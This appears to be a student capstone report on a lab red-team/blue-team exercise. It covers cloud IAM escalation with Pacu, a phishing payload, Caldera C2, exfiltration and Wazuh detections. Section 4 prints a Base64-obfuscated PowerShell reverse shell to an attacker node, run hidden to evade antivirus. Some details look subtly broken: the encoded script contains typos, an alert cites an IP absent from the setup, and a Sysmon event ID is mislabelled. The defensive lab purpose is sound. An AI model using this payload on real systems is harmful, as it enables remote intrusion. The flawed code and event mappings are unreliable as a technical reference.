# Capstone Project: Full Adversary Simulation and Detection Report

## 1. Project Parameters & Architecture Setup
*   **Attacker Node (Kali Linux):** `192.168.1.4` (Hosting Pacu, Metasploit, and Caldera C2)
*   **Target Cloud Layer:** Local Standalone Moto Server (`http://localhost:5000`)
*   **Victim Workstation Node:** Windows 10 Enterprise (`192.168.1.12`)
*   **SIEM Monitoring Center:** Wazuh Central Manager Server (`192.168.1.5`)

---

## 2. Red Team Tactical Execution Log


| Phase | Tool Used | Action Description | MITRE ATTCK Technique |
| :--- | :--- | :--- | :--- |
| **Recon** | Pacu | Redirected global API endpoints to local Moto Server (`localhost:5000`) using dummy tokens to map out exposed virtual S3 cloud data assets. | T1580 - Cloud Infrastructure Discovery |
| **Cloud Attack** | Pacu | Exploited an overly permissive IAM authorization template (`iam:CreateAccessKey`) to scale permissions to Cloud Administrator. | T1098 - Account Manipulation |
| **Phishing** | Metasploit | Generated a reverse-tcp payload and delivered it via a simulated malicious corporate attachment to trigger a local exploit. | T1566.001 - Spearphishing Attachment |
| **C2** | Caldera | Dropped an obfuscated fileless Sandcat callback agent straight into system RAM to maintain long-term command shell visibility. | T1071.001 - Application Web Protocols |
| **Exfiltration** | PowerShell | Archived sensitive file paths into a hidden folder zip bundle and pushed the data out filelessly via an unencrypted HTTP stream. | T1048.003 - Exfiltration Over Alternative Protocol |

---

## 3. Blue Team Analysis Matrix (Wazuh SIEM Logs)


| Timestamp | Alert Description | Source IP | MITRE ID | Investigative Forensic Notes |
| :--- | :--- | :--- | :--- | :--- |
| `2025-08-30 14:00:00` | AWS CloudTrail: Suspicious Privilege Escalation | `192.168.1.50` | T1098 | Flags `CreateAccessKey` actions executed outside standard administrator maintenance windows. |
| `2025-08-30 14:15:22` | Sysmon ID 1: Suspicious Command-Line Scripting | `192.168.1.12` | T1566.001 | Captures target execution profiles running obfuscated stager loops on the desktop workspace. |
| `2025-08-30 14:32:05` | Sysmon ID 22: Anomalous Host Network Connection | `192.168.1.12` | T1071.001 | Detects anomalous network traffic beacons reaching out constantly to the external C2 IP `192.168.1.4`. |
| `2025-08-30 14:55:10` | Sysmon ID 11: File System Archive Modification | `192.168.1.12` | T1048.003 | Registers the sudden compression creation of `exfil.zip` inside a public user folder path. |

---

## 4. Evasion Test Verification Parameters
To thoroughly audit endpoint monitoring thresholds, a standard reverse connection script was encoded into a Base64 block and called directly using environment variables:

```powershell
# Base64 Obfuscated Execution String
\$encoded = "JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMTkyLjE2OC4xLjQnLDQ0NDQpOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tidXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYmF0ZXMuTGVuZ3RoKSkgLW5lIDApPXskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDImPjEgfCgb3V0LVN0cmluZyApOyRzZW5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkc2VuZGJhY2syKTskc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyRzdHJlYW0uRmx1c2goKX07JGNsaWVudC5DbG9zZSgp"

powershell.exe -nop -w hidden -e \$encoded
```
*   **Antivirus Log Validation:** Windows Defender static file signature scanners **failed to detect** or halt this script on initialization.
*   **Wazuh Log Validation:** **Wazuh Rule ID 60105** triggered successfully on the SIEM console. The Windows Antimalware Scan Interface (AMSI) decrypted the script stream in memory right before processing, allowing Sysmon Event ID 1 to pass the cleartext behavioral logs to the manager.

---

## 5. PTES Compliance Report Document (200 Words)

```markdown
# Penetration Testing Execution Standard (PTES) Report

## Executive Summary
A comprehensive security simulation was executed against infrastructure boundaries to evaluate defensive resilience. Testing mapped out an enterprise adversary scenario starting from cloud identity discovery to host system compromise and database asset exfiltration.

## Findings & Technical Detection Analysis
Critical control vulnerabilities were exposed across cloud management structures and localized desktop endpoints.
1. Cloud Control Gaps: Utilizing Pacu, overly permissive identity conditions allowed arbitrary administrator access key validation creation (T1098). This facilitated total control over connected virtualization spaces.
2. Endpoint Log Visibility: Obfuscated script payloads bypassed standard signature antivirus scanning entirely via character isolation structures. However, secondary behavioral security mechanisms captured live operations. Wazuh servers verified Sysmon log alerts tracking continuous network beacon requests out to unauthorized attacker node interfaces.

## Strategic Recommendations
Defensive engineering requires immediate implementation of layered structural barriers:
* Implement explicit Least Privilege access conditions across all cloud service accounts.
* Deploy global Service Control Policies (SCPs) to explicitly deny 'iam:CreateAccessKey' calls.
* Restrict local fileless scripting vulnerabilities by locking systems to PowerShell Constrained Language Mode.
* Configure Endpoint Detection and Response (EDR) rule models to instantly kill unmapped process trees.
```

---

## 6. Project Briefing: Non-Technical Summary (100 Words)

```markdown
### High-Level Security Briefing
A simulated cyber-attack exercise was completed to evaluate our company's defensive network posture. Results showed that while our monitoring software successfully flags complex intruder behaviors, foundational system configurations contain gaps. 

Vulnerabilities within our cloud platform allowed testers to escalate access permissions and simulate corporate data theft. Furthermore, traditional antivirus protections were bypassed using common code-masking techniques. Implementing stricter access controls, adjusting automated system alert levels, and enforcing mandatory security auditing cycles will eliminate these exposures, neutralizing future real-world data compromise attempts.
```
